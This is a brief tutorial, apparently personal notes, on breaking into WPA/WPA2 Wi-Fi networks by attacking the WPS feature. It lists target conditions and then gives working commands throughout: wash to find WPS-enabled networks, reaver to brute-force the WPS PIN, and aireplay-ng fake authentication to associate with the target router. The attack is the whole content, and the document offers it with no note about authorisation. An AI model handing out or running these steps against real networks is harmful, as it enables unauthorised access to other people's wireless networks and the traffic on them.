
----
# Exploiting wps function

Target:
1. has WPA/WPA2 enabled.
2. should have wps function enabled.
3. should have Push Button Authentication disabled.

```shell
# enable network monitoring mode
```

List the networks with wps enabled:
```shell
wash --interface <interface>
```
- `wash` is part of `reaver`. `sudo apt install reaver`

Run reaver to brute-force:
```shell
reaver --bssid <target mac> --channel <target channel> --interface <interface> -vvv --no-associate
```
- `-vvv` verbose
- `--no-associate` we will be doing that below, reaver association not reliable.
- reaver bruteforces and tries every possible pin.

Immediately run below command in another terminal.  
Associate with target network using fakeauth:
```shell
aireplay-ng --fakeauth <interval in sec to associate> -a <target mac> -h <your mac> <interface>
```

----
